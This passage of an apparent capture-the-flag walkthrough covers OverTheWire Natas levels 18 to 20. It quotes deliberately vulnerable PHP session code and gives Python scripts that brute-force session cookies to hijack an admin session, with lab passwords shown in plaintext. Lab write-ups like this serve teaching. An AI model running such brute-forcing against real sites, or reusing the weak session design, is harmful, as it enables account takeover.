<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;?</span>
</span><span class='line'>
</span><span class='line'><span class="nv">$maxid</span> <span class="o">=</span> <span class="mi">640</span><span class="p">;</span> <span class="c1">// 640 should be enough for everyone</span>
</span><span class='line'>
</span><span class='line'><span class="k">function</span> <span class="nf">isValidAdminLogin</span><span class="p">()</span> <span class="p">{</span>
</span><span class='line'>    <span class="k">if</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s2">&quot;username&quot;</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&quot;admin&quot;</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>    <span class="cm">/* This method of authentication appears to be unsafe and has been disabled for now. */</span>
</span><span class='line'>        <span class="c1">//return 1;</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="k">function</span> <span class="nf">isValidID</span><span class="p">(</span><span class="nv">$id</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>    <span class="k">return</span> <span class="nb">is_numeric</span><span class="p">(</span><span class="nv">$id</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="k">function</span> <span class="nf">createID</span><span class="p">(</span><span class="nv">$user</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>    <span class="k">global</span> <span class="nv">$maxid</span><span class="p">;</span>
</span><span class='line'>    <span class="k">return</span> <span class="nx">rand</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="nv">$maxid</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="k">function</span> <span class="nf">debug</span><span class="p">(</span><span class="nv">$msg</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>    <span class="k">if</span><span class="p">(</span><span class="nb">array_key_exists</span><span class="p">(</span><span class="s2">&quot;debug&quot;</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">))</span> <span class="p">{</span>
</span><span class='line'>        <span class="k">print</span> <span class="s2">&quot;DEBUG: </span><span class="si">$msg</span><span class="s2">&lt;br&gt;&quot;</span><span class="p">;</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="k">function</span> <span class="nf">my_session_start</span><span class="p">()</span> <span class="p">{</span>
</span><span class='line'>    <span class="k">if</span><span class="p">(</span><span class="nb">array_key_exists</span><span class="p">(</span><span class="s2">&quot;PHPSESSID&quot;</span><span class="p">,</span> <span class="nv">$_COOKIE</span><span class="p">)</span> <span class="k">and</span> <span class="nx">isValidID</span><span class="p">(</span><span class="nv">$_COOKIE</span><span class="p">[</span><span class="s2">&quot;PHPSESSID&quot;</span><span class="p">]))</span> <span class="p">{</span>
</span><span class='line'>    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nb">session_start</span><span class="p">())</span> <span class="p">{</span>
</span><span class='line'>        <span class="nx">debug</span><span class="p">(</span><span class="s2">&quot;Session start failed&quot;</span><span class="p">);</span>
</span><span class='line'>        <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
</span><span class='line'>    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span><span class='line'>        <span class="nx">debug</span><span class="p">(</span><span class="s2">&quot;Session start ok&quot;</span><span class="p">);</span>
</span><span class='line'>        <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nb">array_key_exists</span><span class="p">(</span><span class="s2">&quot;admin&quot;</span><span class="p">,</span> <span class="nv">$_SESSION</span><span class="p">))</span> <span class="p">{</span>
</span><span class='line'>        <span class="nx">debug</span><span class="p">(</span><span class="s2">&quot;Session was old: admin flag set&quot;</span><span class="p">);</span>
</span><span class='line'>        <span class="nv">$_SESSION</span><span class="p">[</span><span class="s2">&quot;admin&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="c1">// backwards compatible, secure</span>
</span><span class='line'>        <span class="p">}</span>
</span><span class='line'>        <span class="k">return</span> <span class="k">true</span><span class="p">;</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="k">function</span> <span class="nf">print_credentials</span><span class="p">()</span> <span class="p">{</span>
</span><span class='line'>    <span class="k">if</span><span class="p">(</span><span class="nv">$_SESSION</span> <span class="k">and</span> <span class="nb">array_key_exists</span><span class="p">(</span><span class="s2">&quot;admin&quot;</span><span class="p">,</span> <span class="nv">$_SESSION</span><span class="p">)</span> <span class="k">and</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="s2">&quot;admin&quot;</span><span class="p">]</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>    <span class="k">print</span> <span class="s2">&quot;You are an admin. The credentials for the next level are:&lt;br&gt;&quot;</span><span class="p">;</span>
</span><span class='line'>    <span class="k">print</span> <span class="s2">&quot;&lt;pre&gt;Username: natas19</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
</span><span class='line'>    <span class="k">print</span> <span class="s2">&quot;Password: &lt;censored&gt;&lt;/pre&gt;&quot;</span><span class="p">;</span>
</span><span class='line'>    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span><span class='line'>    <span class="k">print</span> <span class="s2">&quot;You are logged in as a regular user. Login as an admin to retrieve credentials for natas19.&quot;</span><span class="p">;</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="nv">$showform</span> <span class="o">=</span> <span class="k">true</span><span class="p">;</span>
</span><span class='line'><span class="k">if</span><span class="p">(</span><span class="nx">my_session_start</span><span class="p">())</span> <span class="p">{</span>
</span><span class='line'>    <span class="nx">print_credentials</span><span class="p">();</span>
</span><span class='line'>    <span class="nv">$showform</span> <span class="o">=</span> <span class="k">false</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span><span class='line'>    <span class="k">if</span><span class="p">(</span><span class="nb">array_key_exists</span><span class="p">(</span><span class="s2">&quot;username&quot;</span><span class="p">,</span> <span class="nv">$_REQUEST</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nb">array_key_exists</span><span class="p">(</span><span class="s2">&quot;password&quot;</span><span class="p">,</span> <span class="nv">$_REQUEST</span><span class="p">))</span> <span class="p">{</span>
</span><span class='line'>    <span class="nb">session_id</span><span class="p">(</span><span class="nx">createID</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s2">&quot;username&quot;</span><span class="p">]));</span>
</span><span class='line'>    <span class="nb">session_start</span><span class="p">();</span>
</span><span class='line'>    <span class="nv">$_SESSION</span><span class="p">[</span><span class="s2">&quot;admin&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="nx">isValidAdminLogin</span><span class="p">();</span>
</span><span class='line'>    <span class="nx">debug</span><span class="p">(</span><span class="s2">&quot;New session started&quot;</span><span class="p">);</span>
</span><span class='line'>    <span class="nv">$showform</span> <span class="o">=</span> <span class="k">false</span><span class="p">;</span>
</span><span class='line'>    <span class="nx">print_credentials</span><span class="p">();</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="cp">?&gt;</span><span class="x"> </span>
</span></code></pre></td></tr></table></div></figure>


<p>This is a lot of code, but first let&rsquo;s see its behavior. When you enter something in the form, a random PHPSESSID between 1 and 640 is created. Then you see the message that you are logged in as a regular user. If you turn debug on and try tampering with the cookie, you will see the message that the session was old and the admin flag was set. The objective appears to be to log in with an admin session ID, and then the credentials for the next level will be printed to the screen. The first time I looked over the code and noticed the fact that the $maxid can be predicted and bruteforced, I thought that&rsquo;s the way to go, but first to understand the code:</p>

<ul>
<li><p>the $maxid holds the maximum value of a PHPSESSID &ndash;> 640</p></li>
<li><p>isValidAdminLogin() just returns 0, so whenever it&rsquo;s called it will set the admin session ID to 0 (not what we want)</p></li>
<li><p>isValidID($id) returns True if the ID is a valid number or numeric string, False otherwise</p></li>
<li><p>createID($user) this is the function that creates the PHPSESSID, with a random value between 1 and 640 (predictable and not long to bruteforce, not what we want in a session ID)</p></li>
<li><p>debug($msg) this just prints messages such as session started, etc.</p></li>
<li><p>my_session_start() this starts a session if there is a valid PHPSESSID cookie, and sets the admin session ID to 0 if it doesn&rsquo;t exist in the $_SESSION array</p></li>
<li><p>print_credentials() prints the password we&rsquo;re after if there is an admin session ID that&rsquo;s set to 1 in the $_SESSION array. Otherwise it just prints a regular message</p></li>
</ul>


<p>Well, the main vulnerabilities are the predictable session ID and the fact that the session starts based on the existence and validity of a cookie, which we can freely control. Since we need to be admin for the next level, we have to bruteforce the session cookies until we hit upon the one with the admin flag set to 1. Python to the rescue again:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="kn">import</span> <span class="nn">requests</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="n">success</span> <span class="o">=</span> <span class="s">&#39;You are an admin&#39;</span>
</span><span class='line'><span class="n">session_id</span> <span class="o">=</span> <span class="mi">0</span>
</span><span class='line'><span class="k">while</span> <span class="n">session_id</span> <span class="o">&lt;</span> <span class="mi">640</span><span class="p">:</span>
</span><span class='line'>    <span class="n">cookie</span> <span class="o">=</span> <span class="p">{</span><span class="s">&#39;PHPSESSID&#39;</span><span class="p">:</span> <span class="nb">str</span><span class="p">(</span><span class="n">session_id</span><span class="p">)}</span>
</span><span class='line'>    <span class="k">print</span> <span class="s">&#39;Trying with session ID: &#39;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">session_id</span><span class="p">)</span>
</span><span class='line'>    <span class="n">guess</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s">&#39;http://natas18.natas.labs.overthewire.org/&#39;</span><span class="p">,</span> \
</span><span class='line'>                          <span class="n">auth</span> <span class="o">=</span> <span class="p">(</span><span class="s">&#39;natas18&#39;</span><span class="p">,</span> <span class="s">&#39;xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP&#39;</span><span class="p">),</span> \
</span><span class='line'>                          <span class="n">cookies</span><span class="o">=</span><span class="n">cookie</span><span class="p">)</span>
</span><span class='line'>    <span class="k">if</span> <span class="n">success</span> <span class="ow">in</span> <span class="n">guess</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
</span><span class='line'>        <span class="k">print</span> <span class="n">guess</span><span class="o">.</span><span class="n">text</span>
</span><span class='line'>        <span class="k">print</span> <span class="s">&#39;Admin session ID was: &#39;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">session_id</span><span class="p">)</span>
</span><span class='line'>        <span class="k">break</span>
</span><span class='line'>    <span class="n">session_id</span> <span class="o">+=</span> <span class="mi">1</span>
</span></code></pre></td></tr></table></div></figure>


<p>I ran it and it discovered the admin session ID was 46. Password for the next level is <code>4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs</code></p>

<h3>Level 19</h3>

<p><img class="center" src="/images/overthewire/natas/natas19.png" title="natas19" alt="natas 19"></p>

<p>We don&rsquo;t have source code this time and apparently the session IDs aren&rsquo;t sequential anymore..Let&rsquo;s see. I logged in with some dummy values and noticed the PHPSESSID cookie is hex encoded now. Decoding it..surprise! It looked like this: <code>512-admin</code>. <em>admin</em> was what I put in the username field. I tried more bogus values for username and password and noticed that the session ID cookie is always constructed like this: <code><em>random number-username</em></code>. So again, brute forcing to the rescue! Since I didn&rsquo;t know how much of the code from the previous challenge has changed, I assumed the max session ID value remained the same:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="kn">import</span> <span class="nn">requests</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="n">success</span> <span class="o">=</span> <span class="s">&#39;You are an admin&#39;</span>
</span><span class='line'><span class="n">session_id</span> <span class="o">=</span> <span class="mi">0</span>
</span><span class='line'><span class="k">while</span> <span class="n">session_id</span> <span class="o">&lt;</span> <span class="mi">640</span><span class="p">:</span>
</span><span class='line'>    <span class="n">pattern</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">session_id</span><span class="p">)</span> <span class="o">+</span> <span class="s">&#39;-admin&#39;</span>
</span><span class='line'>    <span class="n">cookie</span> <span class="o">=</span> <span class="p">{</span><span class="s">&#39;PHPSESSID&#39;</span><span class="p">:</span> <span class="n">pattern</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s">&#39;hex&#39;</span><span class="p">)}</span>
</span><span class='line'>    <span class="k">print</span> <span class="s">&#39;Trying with session ID: &#39;</span> <span class="o">+</span> <span class="n">pattern</span>
</span><span class='line'>    <span class="n">guess</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s">&#39;http://natas19.natas.labs.overthewire.org/&#39;</span><span class="p">,</span> \
</span><span class='line'>                          <span class="n">auth</span> <span class="o">=</span> <span class="p">(</span><span class="s">&#39;natas19&#39;</span><span class="p">,</span> <span class="s">&#39;4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs&#39;</span><span class="p">),</span> \
</span><span class='line'>                          <span class="n">cookies</span><span class="o">=</span><span class="n">cookie</span><span class="p">)</span>
</span><span class='line'>    <span class="k">if</span> <span class="n">success</span> <span class="ow">in</span> <span class="n">guess</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
</span><span class='line'>        <span class="k">print</span> <span class="n">guess</span><span class="o">.</span><span class="n">text</span>
</span><span class='line'>        <span class="k">print</span> <span class="s">&#39;Admin session ID was: &#39;</span> <span class="o">+</span> <span class="n">pattern</span>
</span><span class='line'>        <span class="k">print</span> <span class="n">cookie</span>
</span><span class='line'>        <span class="k">break</span>
</span><span class='line'>    <span class="n">session_id</span> <span class="o">+=</span> <span class="mi">1</span>
</span><span class='line'>
</span></code></pre></td></tr></table></div></figure>


<p>And after a while I hit the jackpot with a sessiod ID of <em>381-admin</em>. The password for the next level is <code>eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF</code></p>

<h3>Level 20</h3>

<p><img class="center" src="/images/overthewire/natas/natas20.png" title="natas20" alt="natas 20"></p>

<p>Code:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
<span class='line-number'>92</span>
<span class='line-number'>93</span>
<span class='line-number'>94</span>
<span class='line-number'>95</span>
<span class='line-number'>96</span>
<span class='line-number'>97</span>
<span class='line-number'>98</span>
<span class='line-number'>99</span>
<span class='line-number'>100</span>
<span class='line-number'>101</span>
<span class='line-number'>102</span>
<span class='line-number'>103</span>
<span class='line-number'>104</span>
<span class='line-number'>105</span>
<span class='line-number'>106</span>
<span class='line-number'>107</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;?</span>
</span><span class='line'>
</span><span class='line'><span class="k">function</span> <span class="nf">debug</span><span class="p">(</span><span class="nv">$msg</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>    <span class="k">if</span><span class="p">(</span><span class="nb">array_key_exists</span><span class="p">(</span><span class="s2">&quot;debug&quot;</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">))</span> <span class="p">{</span>
</span><span class='line'>        <span class="k">print</span> <span class="s2">&quot;DEBUG: </span><span class="si">$msg</span><span class="s2">&lt;br&gt;&quot;</span><span class="p">;</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="k">function</span> <span class="nf">print_credentials</span><span class="p">()</span> <span class="p">{</span>
</span><span class='line'>    <span class="k">if</span><span class="p">(</span><span class="nv">$_SESSION</span> <span class="k">and</span> <span class="nb">array_key_exists</span><span class="p">(</span><span class="s2">&quot;admin&quot;</span><span class="p">,</span> <span class="nv">$_SESSION</span><span class="p">)</span> <span class="k">and</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="s2">&quot;admin&quot;</span><span class="p">]</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>    <span class="k">print</span> <span class="s2">&quot;You are an admin. The credentials for the next level are:&lt;br&gt;&quot;</span><span class="p">;</span>
</span><span class='line'>    <span class="k">print</span> <span class="s2">&quot;&lt;pre&gt;Username: natas21</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
</span><span class='line'>    <span class="k">print</span> <span class="s2">&quot;Password: &lt;censored&gt;&lt;/pre&gt;&quot;</span><span class="p">;</span>
</span><span class='line'>    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span><span class='line'>    <span class="k">print</span> <span class="s2">&quot;You are logged in as a regular user. Login as an admin to retrieve credentials for natas21.&quot;</span><span class="p">;</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="cm">/* we don&#39;t need this */</span>
</span><span class='line'><span class="k">function</span> <span class="nf">myopen</span><span class="p">(</span><span class="nv">$path</span><span class="p">,</span> <span class="nv">$name</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>    <span class="c1">//debug(&quot;MYOPEN $path $name&quot;); </span>
</span><span class='line'>    <span class="k">return</span> <span class="k">true</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="cm">/* we don&#39;t need this */</span>
</span><span class='line'><span class="k">function</span> <span class="nf">myclose</span><span class="p">()</span> <span class="p">{</span>
</span><span class='line'>    <span class="c1">//debug(&quot;MYCLOSE&quot;); </span>
</span><span class='line'>    <span class="k">return</span> <span class="k">true</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="k">function</span> <span class="nf">myread</span><span class="p">(</span><span class="nv">$sid</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>    <span class="nx">debug</span><span class="p">(</span><span class="s2">&quot;MYREAD </span><span class="si">$sid</span><span class="s2">&quot;</span><span class="p">);</span>
</span><span class='line'>    <span class="k">if</span><span class="p">(</span><span class="nb">strspn</span><span class="p">(</span><span class="nv">$sid</span><span class="p">,</span> <span class="s2">&quot;1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM-&quot;</span><span class="p">)</span> <span class="o">!=</span> <span class="nb">strlen</span><span class="p">(</span><span class="nv">$sid</span><span class="p">))</span> <span class="p">{</span>
</span><span class='line'>    <span class="nx">debug</span><span class="p">(</span><span class="s2">&quot;Invalid SID&quot;</span><span class="p">);</span>
</span><span class='line'>        <span class="k">return</span> <span class="s2">&quot;&quot;</span><span class="p">;</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>    <span class="nv">$filename</span> <span class="o">=</span> <span class="nb">session_save_path</span><span class="p">()</span> <span class="o">.</span> <span class="s2">&quot;/&quot;</span> <span class="o">.</span> <span class="s2">&quot;mysess_&quot;</span> <span class="o">.</span> <span class="nv">$sid</span><span class="p">;</span>
</span><span class='line'>    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nb">file_exists</span><span class="p">(</span><span class="nv">$filename</span><span class="p">))</span> <span class="p">{</span>
</span><span class='line'>        <span class="nx">debug</span><span class="p">(</span><span class="s2">&quot;Session file doesn&#39;t exist&quot;</span><span class="p">);</span>
</span><span class='line'>        <span class="k">return</span> <span class="s2">&quot;&quot;</span><span class="p">;</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>    <span class="nx">debug</span><span class="p">(</span><span class="s2">&quot;Reading from &quot;</span><span class="o">.</span> <span class="nv">$filename</span><span class="p">);</span>
</span><span class='line'>    <span class="nv">$data</span> <span class="o">=</span> <span class="nb">file_get_contents</span><span class="p">(</span><span class="nv">$filename</span><span class="p">);</span>
</span><span class='line'>    <span class="nv">$_SESSION</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
</span><span class='line'>    <span class="k">foreach</span><span class="p">(</span><span class="nb">explode</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">,</span> <span class="nv">$data</span><span class="p">)</span> <span class="k">as</span> <span class="nv">$line</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>        <span class="nx">debug</span><span class="p">(</span><span class="s2">&quot;Read [</span><span class="si">$line</span><span class="s2">]&quot;</span><span class="p">);</span>
</span><span class='line'>    <span class="nv">$parts</span> <span class="o">=</span> <span class="nb">explode</span><span class="p">(</span><span class="s2">&quot; &quot;</span><span class="p">,</span> <span class="nv">$line</span><span class="p">,</span> <span class="mi">2</span><span class="p">);</span>
</span><span class='line'>    <span class="k">if</span><span class="p">(</span><span class="nv">$parts</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">!=</span> <span class="s2">&quot;&quot;</span><span class="p">)</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="nv">$parts</span><span class="p">[</span><span class="mi">0</span><span class="p">]]</span> <span class="o">=</span> <span class="nv">$parts</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>    <span class="k">return</span> <span class="nb">session_encode</span><span class="p">();</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="k">function</span> <span class="nf">mywrite</span><span class="p">(</span><span class="nv">$sid</span><span class="p">,</span> <span class="nv">$data</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>    <span class="c1">// $data contains the serialized version of $_SESSION</span>
</span><span class='line'>    <span class="c1">// but our encoding is better</span>
</span><span class='line'>    <span class="nx">debug</span><span class="p">(</span><span class="s2">&quot;MYWRITE </span><span class="si">$sid</span><span class="s2"> </span><span class="si">$data</span><span class="s2">&quot;</span><span class="p">);</span>
</span><span class='line'>    <span class="c1">// make sure the sid is alnum only!!</span>
</span><span class='line'>    <span class="k">if</span><span class="p">(</span><span class="nb">strspn</span><span class="p">(</span><span class="nv">$sid</span><span class="p">,</span> <span class="s2">&quot;1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM-&quot;</span><span class="p">)</span> <span class="o">!=</span> <span class="nb">strlen</span><span class="p">(</span><span class="nv">$sid</span><span class="p">))</span> <span class="p">{</span>
</span><span class='line'>    <span class="nx">debug</span><span class="p">(</span><span class="s2">&quot;Invalid SID&quot;</span><span class="p">);</span>
</span><span class='line'>        <span class="k">return</span><span class="p">;</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>    <span class="nv">$filename</span> <span class="o">=</span> <span class="nb">session_save_path</span><span class="p">()</span> <span class="o">.</span> <span class="s2">&quot;/&quot;</span> <span class="o">.</span> <span class="s2">&quot;mysess_&quot;</span> <span class="o">.</span> <span class="nv">$sid</span><span class="p">;</span>
</span><span class='line'>    <span class="nv">$data</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">;</span>
</span><span class='line'>    <span class="nx">debug</span><span class="p">(</span><span class="s2">&quot;Saving in &quot;</span><span class="o">.</span> <span class="nv">$filename</span><span class="p">);</span>
</span><span class='line'>    <span class="nb">ksort</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">);</span>
</span><span class='line'>    <span class="k">foreach</span><span class="p">(</span><span class="nv">$_SESSION</span> <span class="k">as</span> <span class="nv">$key</span> <span class="o">=&gt;</span> <span class="nv">$value</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>        <span class="nx">debug</span><span class="p">(</span><span class="s2">&quot;</span><span class="si">$key</span><span class="s2"> =&gt; </span><span class="si">$value</span><span class="s2">&quot;</span><span class="p">);</span>
</span><span class='line'>        <span class="nv">$data</span> <span class="o">.=</span> <span class="s2">&quot;</span><span class="si">$key</span><span class="s2"> </span><span class="si">$value</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>    <span class="nb">file_put_contents</span><span class="p">(</span><span class="nv">$filename</span><span class="p">,</span> <span class="nv">$data</span><span class="p">);</span>
</span><span class='line'>    <span class="nb">chmod</span><span class="p">(</span><span class="nv">$filename</span><span class="p">,</span> <span class="mo">0600</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="cm">/* we don&#39;t need this */</span>
